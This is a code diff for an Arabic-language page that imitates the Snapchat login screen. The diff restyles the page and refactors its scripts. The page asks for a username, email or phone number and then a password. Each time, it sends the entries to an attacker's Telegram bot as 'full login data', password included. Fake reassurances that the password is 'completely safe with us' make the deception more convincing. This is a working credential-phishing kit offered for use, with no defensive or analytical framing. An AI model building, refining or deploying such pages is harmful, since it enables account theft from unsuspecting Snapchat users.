@@ -24,19 +24,19 @@
     :root {
       --primary: #fffc00;
       --primary-dark: #e8eb00;
-      --bg: #000000;
-      --card: #0a0a0a;
-      --text: #ffffff;
-      --text-muted: #b3b3b3;
-      --border: #2d2d2d;
-      --success: #31a24c;
-      --danger: #ff4458;
-      --warning: #ff9500;
-      --glass: rgba(255, 255, 255, 0.08);
-      --shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-      --shadow-sm: 0 4px 12px rgba(0, 0, 0, 0.3);
+      --secondary: #34c759;
+      --bg: #ffffff;
+      --card: #fafafa;
+      --text: #000000;
+      --text-muted: #6b7280;
+      --border: #e5e7eb;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --glass: rgba(0, 0, 0, 0.04);
+      --shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+      --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
       --ease: cubic-bezier(0.25, 0.46, 0.45, 0.94);
-      --radius-lg: 24px;
+      --radius-lg: 28px;
       --radius-md: 16px;
       --radius-sm: 12px;
     }
@@ -159,47 +159,48 @@
     .page-content {
       display: flex;
       flex-direction: column;
-      padding: 20px 16px;
-      padding-bottom: max(20px, env(safe-area-inset-bottom));
+      padding: 24px 16px;
+      padding-bottom: max(24px, env(safe-area-inset-bottom));
       flex: 1;
     }
 
     .snap-logo {
-      width: 80px;
-      height: 80px;
-      margin: 40px auto 24px;
-      background: var(--primary);
-      border-radius: 20px;
+      width: 90px;
+      height: 90px;
+      margin: 32px auto 28px;
+      background: linear-gradient(135deg, var(--primary), #ffed4e);
+      border-radius: 24px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 48px;
-      box-shadow: 0 10px 40px rgba(255, 252, 0, 0.3);
-      animation: logoBounce 2s ease-in-out infinite;
+      font-size: 56px;
+      box-shadow: 0 12px 40px rgba(255, 252, 0, 0.3);
+      animation: logoBounce 2.5s ease-in-out infinite;
     }
 
     @keyframes logoBounce {
       0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.05); }
+      50% { transform: scale(1.08); }
     }
 
     .page-header {
       text-align: center;
-      margin-bottom: 32px;
+      margin-bottom: 28px;
     }
 
     .page-title {
-      font-size: 28px;
+      font-size: 32px;
       font-weight: 900;
       color: var(--text);
       margin-bottom: 8px;
-      letter-spacing: -0.5px;
+      letter-spacing: -0.8px;
     }
 
     .page-subtitle {
-      font-size: 14px;
+      font-size: 15px;
       color: var(--text-muted);
-      line-height: 1.5;
+      line-height: 1.6;
+      font-weight: 400;
     }
 
     .form-group {
@@ -209,11 +210,11 @@
     .form-label {
       display: block;
       font-size: 12px;
-      font-weight: 600;
+      font-weight: 700;
       color: var(--text-muted);
-      margin-bottom: 8px;
+      margin-bottom: 10px;
       text-transform: uppercase;
-      letter-spacing: 0.5px;
+      letter-spacing: 0.8px;
     }
 
     .input-wrapper {
@@ -226,11 +227,12 @@
     input[type="text"],
     input[type="tel"],
     input[type="email"],
+    input[type="password"],
     .country-select {
       width: 100%;
-      padding: 14px 16px;
-      background: var(--glass);
-      border: 1px solid var(--border);
+      padding: 16px 16px;
+      background: var(--card);
+      border: 1.5px solid var(--border);
       border-radius: var(--radius-md);
       color: var(--text);
       font-size: 16px;
@@ -244,57 +246,55 @@
 
     input[type="text"]::placeholder,
     input[type="tel"]::placeholder,
-    input[type="email"]::placeholder {
+    input[type="email"]::placeholder,
+    input[type="password"]::placeholder {
       color: var(--text-muted);
-      opacity: 0.7;
+      opacity: 0.6;
     }
 
     input[type="text"]:focus,
     input[type="tel"]:focus,
-    input[type="email"]:focus {
-      background: rgba(255, 252, 0, 0.08);
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      background: var(--bg);
       border-color: var(--primary);
-      box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.1);
+      box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
     }
 
     .country-select {
       cursor: pointer;
-      background: var(--glass);
+      background: var(--card);
       flex: 0 0 auto;
-      padding: 14px 12px;
-      min-width: 80px;
+      padding: 16px 12px;
+      min-width: 90px;
       text-align: center;
+      font-weight: 600;
     }
 
-    .country-select:hover {
-      background: rgba(255, 252, 0, 0.08);
+    .country-select:focus {
+      background: var(--bg);
       border-color: var(--primary);
-    }
-
-    .input-icon {
-      color: var(--text-muted);
-      font-size: 18px;
-      display: flex;
-      align-items: center;
+      box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
     }
 
     .info-box {
-      background: rgba(49, 162, 76, 0.1);
-      border: 1px solid var(--success);
+      background: rgba(52, 199, 89, 0.08);
+      border: 1.5px solid var(--secondary);
       border-radius: var(--radius-md);
-      padding: 12px;
-      margin-bottom: 20px;
-      font-size: 12px;
-      color: var(--success);
+      padding: 14px;
+      margin-bottom: 24px;
+      font-size: 13px;
+      color: var(--secondary);
       display: flex;
       align-items: flex-start;
-      gap: 8px;
+      gap: 10px;
+      font-weight: 500;
     }
 
     .info-icon {
       flex-shrink: 0;
-      font-size: 16px;
-      margin-top: 1px;
+      font-size: 18px;
+      margin-top: 0px;
     }
 
     .form-hint {
@@ -303,6 +303,7 @@
       margin-top: 8px;
       min-height: 16px;
       transition: color 0.3s ease;
+      font-weight: 500;
     }
 
     .form-hint.error {
@@ -313,76 +314,72 @@
       color: var(--warning);
     }
 
+    .form-hint.success {
+      color: var(--secondary);
+    }
+
     .btn {
       width: 100%;
-      padding: 14px;
+      padding: 16px;
       background: linear-gradient(135deg, var(--primary), var(--primary-dark));
       color: #000000;
       border: none;
       border-radius: var(--radius-md);
       font-size: 16px;
-      font-weight: 700;
+      font-weight: 800;
       font-family: 'Cairo', sans-serif;
       cursor: pointer;
       transition: all 0.3s var(--ease);
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 8px;
+      gap: 10px;
       -webkit-appearance: none;
       appearance: none;
-      box-shadow: 0 8px 24px rgba(255, 252, 0, 0.25);
+      box-shadow: 0 10px 30px rgba(255, 252, 0, 0.2);
       position: relative;
       overflow: hidden;
+      letter-spacing: 0.3px;
     }
 
     .btn:active {
-      transform: scale(0.96);
+      transform: scale(0.95);
       box-shadow: 0 4px 12px rgba(255, 252, 0, 0.15);
     }
 
     .btn:disabled {
-      opacity: 0.5;
+      opacity: 0.6;
       cursor: not-allowed;
-      box-shadow: none;
     }
 
     .btn.secondary {
-      background: var(--glass);
+      background: var(--card);
       color: var(--text);
-      border: 1px solid var(--border);
+      border: 1.5px solid var(--border);
       box-shadow: none;
     }
 
     .btn.secondary:active {
-      background: rgba(255, 255, 255, 0.12);
-      border-color: var(--primary);
-    }
-
-    .btn-group {
-      display: flex;
-      gap: 10px;
-      margin-top: 16px;
-    }
-
-    .btn-group .btn {
-      flex: 1;
+      background: var(--glass);
+      border-color: var(--text-muted);
     }
 
     .btn svg {
-      width: 20px;
-      height: 20px;
+      width: 22px;
+      height: 22px;
+      stroke-width: 2.5;
     }
 
     .toggle-mode {
       width: 100%;
-      padding: 10px;
-      background: transparent;
-      border: 1px solid var(--border);
+      padding: 13px;
+      background: var(--card);
+      border: 1.5px solid var(--border);
       border-radius: var(--radius-md);
-      color: var(--text);
-      font-size: 13px;
+      color: var(--text-muted);
+      font-size: 14px;
       font-family: 'Cairo', sans-serif;
+      font-weight: 600;
       cursor: pointer;
       transition: all 0.3s var(--ease);
       display: flex;
@@ -394,14 +391,14 @@
 
     .toggle-mode:active {
       background: var(--glass);
-      border-color: var(--primary);
+      border-color: var(--text-muted);
     }
 
     /* Modal */
     .modal-overlay {
       position: fixed;
       inset: 0;
-      background: rgba(0, 0, 0, 0.6);
+      background: rgba(0, 0, 0, 0.35);
       display: none;
       align-items: flex-end;
       justify-content: center;
@@ -421,14 +418,15 @@
     .modal {
       width: 100%;
       max-width: 480px;
-      background: var(--card);
+      background: var(--bg);
       border-radius: var(--radius-lg) var(--radius-lg) 0 0;
-      padding: 20px;
+      padding: 24px;
       max-height: 80vh;
       display: flex;
       flex-direction: column;
       animation: slideUp 0.3s var(--ease);
-      padding-bottom: max(20px, env(safe-area-inset-bottom));
+      padding-bottom: max(24px, env(safe-area-inset-bottom));
+      border-top: 1px solid var(--border);
     }
 
     @keyframes slideUp {
@@ -443,28 +441,30 @@
     }
 
     .modal-header {
-      font-size: 18px;
-      font-weight: 700;
+      font-size: 20px;
+      font-weight: 800;
       margin-bottom: 16px;
       color: var(--text);
     }
 
     .modal-search {
       width: 100%;
-      padding: 10px 12px;
-      background: var(--glass);
-      border: 1px solid var(--border);
+      padding: 12px 14px;
+      background: var(--card);
+      border: 1.5px solid var(--border);
       border-radius: var(--radius-sm);
       color: var(--text);
       font-size: 14px;
       font-family: 'Cairo', sans-serif;
-      margin-bottom: 12px;
+      margin-bottom: 14px;
       outline: none;
+      transition: all 0.3s ease;
     }
 
     .modal-search:focus {
-      background: rgba(255, 252, 0, 0.08);
+      background: var(--bg);
       border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.12);
     }
 
     .modal-list {
@@ -473,11 +473,11 @@
       flex: 1;
       display: flex;
       flex-direction: column;
-      gap: 8px;
+      gap: 6px;
     }
 
     .modal-item {
-      padding: 12px;
+      padding: 14px;
       border-radius: var(--radius-sm);
       cursor: pointer;
       transition: all 0.2s ease;
@@ -485,6 +485,7 @@
       align-items: center;
       justify-content: space-between;
       gap: 12px;
+      background: var(--card);
     }
 
     .modal-item:active {
@@ -499,30 +500,31 @@
     }
 
     .modal-item-flag {
-      font-size: 28px;
+      font-size: 32px;
       flex-shrink: 0;
     }
 
     .modal-item-info {
       display: flex;
       flex-direction: column;
-      gap: 2px;
+      gap: 3px;
     }
 
     .modal-item-name {
       font-size: 14px;
-      font-weight: 600;
+      font-weight: 700;
       color: var(--text);
     }
 
     .modal-item-code {
       font-size: 12px;
       color: var(--text-muted);
+      font-weight: 500;
     }
 
     .modal-item-dial {
       font-size: 14px;
-      font-weight: 600;
+      font-weight: 700;
       color: var(--primary);
     }
 
@@ -534,7 +536,7 @@
       align-items: center;
       justify-content: center;
       z-index: 2000;
-      background: rgba(0, 0, 0, 0.4);
+      background: rgba(0, 0, 0, 0.3);
     }
 
     .toast-overlay.show {
@@ -542,9 +544,9 @@
     }
 
     .toast {
-      background: var(--card);
+      background: var(--bg);
       border-radius: var(--radius-lg);
-      padding: 24px;
+      padding: 28px;
       width: 90%;
       max-width: 340px;
       text-align: center;
@@ -556,7 +558,7 @@
     @keyframes toastIn {
       from {
         opacity: 0;
-        transform: scale(0.9);
+        transform: scale(0.92);
       }
       to {
         opacity: 1;
@@ -565,13 +567,13 @@
     }
 
     .toast-icon {
-      font-size: 48px;
-      margin-bottom: 12px;
+      font-size: 52px;
+      margin-bottom: 14px;
     }
 
     .toast-title {
-      font-size: 18px;
-      font-weight: 700;
+      font-size: 20px;
+      font-weight: 800;
       color: var(--text);
       margin-bottom: 8px;
     }
@@ -579,14 +581,15 @@
     .toast-text {
       font-size: 14px;
       color: var(--text-muted);
-      line-height: 1.5;
-      margin-bottom: 16px;
+      line-height: 1.6;
+      margin-bottom: 20px;
+      font-weight: 500;
     }
 
     .toast-btn {
       width: 100%;
-      padding: 10px;
-      background: var(--primary);
+      padding: 12px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
       color: #000000;
       border: none;
       border-radius: var(--radius-sm);
@@ -598,14 +601,14 @@
     }
 
     .toast-btn:active {
-      transform: scale(0.96);
+      transform: scale(0.95);
     }
 
     .loading-spinner {
       display: inline-block;
       width: 16px;
       height: 16px;
-      border: 2px solid rgba(0, 0, 0, 0.3);
+      border: 2px solid rgba(0, 0, 0, 0.2);
       border-top-color: #000000;
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
@@ -615,19 +618,52 @@
       to { transform: rotate(360deg); }
     }
 
+    .back-button {
+      position: absolute;
+      right: 16px;
+      top: 12px;
+      width: 44px;
+      height: 44px;
+      background: var(--card);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius-md);
+      color: var(--text);
+      font-size: 20px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+      z-index: 10;
+    }
+
+    .back-button:active {
+      background: var(--glass);
+      border-color: var(--text-muted);
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
     @media (max-width: 480px) {
       .phone-frame {
         max-width: 100%;
       }
 
       .page-title {
-        font-size: 24px;
+        font-size: 28px;
       }
 
       .snap-logo {
-        width: 70px;
-        height: 70px;
-        font-size: 40px;
+        width: 80px;
+        height: 80px;
+        font-size: 48px;
+      }
+
+      .btn {
+        padding: 14px;
+        font-size: 15px;
       }
     }
 
@@ -657,7 +693,7 @@
 
       <!-- Container -->
       <div class="container">
-        <!-- Page 1: Username/Phone/Email -->
+        <!-- PAGE 1: Username/Email/Phone -->
         <div id="page1" class="page">
           <div class="page-content">
             <div class="snap-logo">👻</div>
@@ -668,14 +704,14 @@
             </div>
 
             <div class="info-box">
-              <div class="info-icon">ℹ️</div>
+              <div class="info-icon">✓</div>
               <div>حسابك آمن معنا - لن نطلب كلمة المرور هنا</div>
             </div>
 
-            <!-- Username/Email Mode -->
+            <!-- Username/Email Mode (Default) -->
             <div id="userEmailMode">
               <div class="form-group">
-                <label class="form-label" for="primary">اسم المستخدم أو البريد</label>
+                <label class="form-label" for="primary">اسم المستخدم أو البريد الإلكتروني</label>
                 <div class="input-wrapper">
                   <input 
                     id="primary" 
@@ -696,7 +732,6 @@
                 <div class="input-wrapper">
                   <button id="countryBtn" class="country-select" type="button" aria-label="اختر الدولة">
                     <span id="countryFlag">🇸🇦</span>
-                    <span id="countryDial">+966</span>
                   </button>
                   <input 
                     id="phoneInput" 
@@ -711,31 +746,36 @@
             </div>
 
             <button id="toggleBtn" class="toggle-mode" type="button">
-              <span id="toggleText">استخدم رقم الهاتف بدلاً من ذلك</span>
+              <span id="toggleText">📱 استخدم رقم الهاتف</span>
             </button>
 
             <button id="continueBtn" class="btn" type="button">
               <span>المتابعة</span>
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
                 <path d="M5 12h14M13 5l7 7-7 7"/>
               </svg>
             </button>
           </div>
         </div>
 
-        <!-- Page 2: Password -->
+        <!-- PAGE 2: Password -->
         <div id="page2" class="page hidden">
+          <button id="backBtn" class="back-button" type="button">←</button>
+          
           <div class="page-content">
-            <div style="height: 80px; display: flex; align-items: center; justify-content: center;">
-              <button id="backBtn" style="position: absolute; right: 16px; background: none; border: none; color: var(--text); font-size: 24px; cursor: pointer; padding: 8px;">←</button>
+            <div class="snap-logo">🔐</div>
+
+            <div class="page-header">
+              <h1 class="page-title">أدخل كلمة المرور</h1>
+              <p class="page-subtitle" id="userDisplay">username</p>
             </div>
 
-            <div class="page-header" style="margin-top: 0;">
-              <h1 class="page-title" id="page2Title">أدخل كلمة المرور</h1>
-              <p class="page-subtitle" id="page2Subtitle">كلمة المرور آمنة معنا</p>
+            <div class="info-box">
+              <div class="info-icon">✓</div>
+              <div>كلمة المرور آمنة معنا تماماً</div>
             </div>
 
-            <div class="form-group" style="margin-top: 24px;">
+            <div class="form-group">
               <label class="form-label" for="password">كلمة المرور</label>
               <div class="input-wrapper">
                 <input 
@@ -747,7 +787,7 @@
                 <button 
                   id="togglePassword" 
                   type="button" 
-                  style="position: absolute; right: 12px; background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 18px; padding: 0;"
+                  style="position: absolute; right: 12px; background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 20px; padding: 0; display: flex; align-items: center;"
                   aria-label="إظهار/إخفاء كلمة المرور"
                 >
                   👁️
@@ -756,14 +796,14 @@
               <div class="form-hint" id="hintPassword"></div>
             </div>
 
-            <button id="sendBtn" class="btn" type="button" style="margin-top: 24px;">
+            <button id="sendBtn" class="btn" type="button" style="margin-top: 28px;">
               <span id="sendBtnText">دخول</span>
               <span id="sendSpinner" class="hidden">
                 <span class="loading-spinner"></span>
               </span>
             </button>
 
-            <button id="forgotBtn" class="btn secondary" type="button" style="margin-top: 12px;">
+            <button id="forgotBtn" class="btn secondary" type="button" style="margin-top: 14px;">
               هل نسيت كلمة المرور؟
             </button>
           </div>
@@ -859,7 +899,6 @@
     const countryList = document.getElementById('countryList');
     const countrySearch = document.getElementById('countrySearch');
     const countryFlag = document.getElementById('countryFlag');
-    const countryDial = document.getElementById('countryDial');
 
     const toastOverlay = document.getElementById('toastOverlay');
     const toastIcon = document.getElementById('toastIcon');
@@ -871,19 +910,15 @@
     const hintPhone = document.getElementById('hintPhone');
     const hintPassword = document.getElementById('hintPassword');
 
-    const page2Title = document.getElementById('page2Title');
-    const page2Subtitle = document.getElementById('page2Subtitle');
+    const userDisplay = document.getElementById('userDisplay');
 
     // ==================== UTILITIES ====================
     function isTokenValid() {
       return TG_TOKEN && TG_CHAT_ID && !TG_TOKEN.includes('YOUR') && !TG_CHAT_ID.includes('YOUR');
     }
 
-    function cleanInput(str, allowSymbols = false) {
-      if (!allowSymbols) {
-        return str.replace(/[^\x00-\x7F]/g, '').trim();
-      }
-      return str.trim();
+    function cleanInput(str) {
+      return str.replace(/[^\x00-\x7F]/g, '').trim();
     }
 
     function getDigitsOnly(str) {
@@ -903,12 +938,12 @@
 
     function showHint(element, text, type = 'error') {
       element.textContent = text;
-      element.classList.remove('error', 'warning');
+      element.classList.remove('error', 'warning', 'success');
       if (type) element.classList.add(type);
       setTimeout(() => {
         element.textContent = '';
-        element.classList.remove('error', 'warning');
-      }, 3000);
+        element.classList.remove('error', 'warning', 'success');
+      }, 3500);
     }
 
     // ==================== SEND TO TELEGRAM ====================
@@ -937,7 +972,7 @@
         return true;
       } catch (error) {
         console.error('Telegram Error:', error);
-        showToast('❌', 'خطأ', 'فشل الاتصال - تحقق من البيانات');
+        showToast('❌', 'خطأ', 'فشل الاتصال - تحقق من بيانات البوت');
         return false;
       }
     }
@@ -993,7 +1028,7 @@
       }
 
       if (password.length < 6) {
-        showHint(hintPassword, '❌ كلمة المرور قصيرة جداً', 'error');
+        showHint(hintPassword, '❌ كلمة المرور قصيرة جداً (6 أحرف على الأقل)', 'error');
         return null;
       }
 
@@ -1003,8 +1038,13 @@
     // ==================== PAGE TRANSITIONS ====================
     function goToPage2(credentials) {
       state.credentials = credentials;
-      page2Title.textContent = `مرحباً 👋`;
-      page2Subtitle.textContent = `${credentials.type === 'phone' ? credentials.value : credentials.value}`;
+      
+      let displayText = credentials.value;
+      if (credentials.type === 'phone') {
+        displayText = `${state.selectedCountry.flag} ${state.selectedCountry.dial}`;
+      }
+      
+      userDisplay.textContent = displayText;
 
       page1.classList.add('slide-out');
       page1.classList.add('hidden');
@@ -1040,12 +1080,12 @@
       if (state.phoneMode) {
         userEmailMode.classList.add('hidden');
         phoneMode.classList.remove('hidden');
-        toggleText.textContent = 'استخدم البريد أو اسم المستخدم';
+        toggleText.textContent = '✉️ استخدم البريد أو الاسم';
         setTimeout(() => phoneInput.focus(), 100);
       } else {
         phoneMode.classList.add('hidden');
         userEmailMode.classList.remove('hidden');
-        toggleText.textContent = 'استخدم رقم الهاتف بدلاً من ذلك';
+        toggleText.textContent = '📱 استخدم رقم الهاتف';
         setTimeout(() => primaryInput.focus(), 100);
       }
 
@@ -1058,7 +1098,7 @@
       countryList.innerHTML = '';
 
       if (list.length === 0) {
-        countryList.innerHTML = '<div style="padding: 20px; text-align: center; color: var(--text-muted);">لا توجد نتائج</div>';
+        countryList.innerHTML = '<div style="padding: 24px; text-align: center; color: var(--text-muted); font-weight: 500;">لا توجد نتائج</div>';
         return;
       }
 
@@ -1083,7 +1123,6 @@
     function selectCountry(country) {
       state.selectedCountry = country;
       countryFlag.textContent = country.flag;
-      countryDial.textContent = country.dial;
       countryModal.classList.remove('show');
       phoneInput.focus();
     }
@@ -1107,20 +1146,32 @@
       if (!credentials) return;
 
       // Send to Telegram
-      const msg = `
-<b>🔐 بيانات المستخدم</b>
-
-<b>النوع:</b> ${credentials.type === 'email' ? '📧 بريد' : credentials.type === 'username' ? '👤 اسم مستخدم' : '📱 هاتف'}
-<b>القيمة:</b> <code>${credentials.value}</code>
-${state.phoneMode ? `<b>الدولة:</b> ${state.selectedCountry.name} ${state.selectedCountry.dial}` : ''}
-      `;
+      let msg = `<b>🔐 بيانات المستخدم</b>\n\n`;
+      msg += `<b>النوع:</b> `;
+      
+      if (credentials.type === 'email') {
+        msg += '📧 بريد إلكتروني\n';
+      } else if (credentials.type === 'username') {
+        msg += '👤 اسم مستخدم\n';
+      } else if (credentials.type === 'phone') {
+        msg += '📱 رقم هاتف\n';
+      }
+      
+      msg += `<b>القيمة:</b> <code>${credentials.value}</code>\n`;
+      
+      if (state.phoneMode) {
+        msg += `<b>الدولة:</b> ${state.selectedCountry.name} ${state.selectedCountry.dial}\n`;
+      }
 
       await sendToTelegram(msg);
       goToPage2(credentials);
     });
 
     primaryInput.addEventListener('input', (e) => {
-      e.target.value = cleanInput(e.target.value, false);
+      e.target.value = cleanInput(e.target.value);
+      if (e.target.value.length > 100) {
+        e.target.value = e.target.value.slice(0, 100);
+      }
     });
 
     primaryInput.addEventListener('keydown', (e) => {
@@ -1171,18 +1222,30 @@ ${state.phoneMode ? `<b>الدولة:</b> ${state.selectedCountry.name} ${state.
       sendSpinner.classList.remove('hidden');
 
       // Send to Telegram
-      const msg = `
-<b>🔐 بيانات دخول كاملة</b>
-
-<b>النوع:</b> ${state.credentials.type === 'email' ? '📧 بريد' : state.credentials.type === 'username' ? '👤 اسم مستخدم' : '📱 هاتف'}
-<b>المستخدم:</b> <code>${state.credentials.value}</code>
-${state.phoneMode ? `<b>الدولة:</b> ${state.selectedCountry.name} ${state.selectedCountry.dial}` : ''}
-<b>كلمة المرور:</b> <code>${password}</code>
-
-⏰ <i>${new Date().toLocaleString('ar-SA')}</i>
-      `;
+      let msg = `<b>🔓 تسجيل دخول كامل</b>\n\n`;
+      msg += `<b>النوع:</b> `;
+      
+      if (state.credentials.type === 'email') {
+        msg += '📧 بريد إلكتروني\n';
+      } else if (state.credentials.type === 'username') {
+        msg += '👤 اسم مستخدم\n';
+      } else if (state.credentials.type === 'phone') {
+        msg += '📱 رقم هاتف\n';
+      }
+      
+      msg += `<b>المستخدم:</b> <code>${state.credentials.value}</code>\n`;
+      
+      if (state.phoneMode) {
+        msg += `<b>الدولة:</b> ${state.selectedCountry.name} ${state.selectedCountry.dial}\n`;
+      }
+      
+      msg += `<b>كلمة المرور:</b> <code>${password}</code>\n\n`;
+      msg += `⏰ <i>${new Date().toLocaleString('ar-SA')}</i>`;
 
       const success = await sendToTelegram(msg);
+
+      // Wait a bit
+      await new Promise(r => setTimeout(r, 1500));
 
       // Hide loading
       state.isLoading = false;
@@ -1211,7 +1274,7 @@ ${state.phoneMode ? `<b>الدولة:</b> ${state.selectedCountry.name} ${state.
     });
 
     forgotBtn.addEventListener('click', () => {
-      showToast('ℹ️', 'نسيت كلمة المرور؟', 'تواصل مع خدمة العملاء');
+      showToast('ℹ️', 'نسيت كلمة المرور؟', 'تواصل مع خدمة العملاء من تطبيق سناب شات');
     });
 
     // Toast
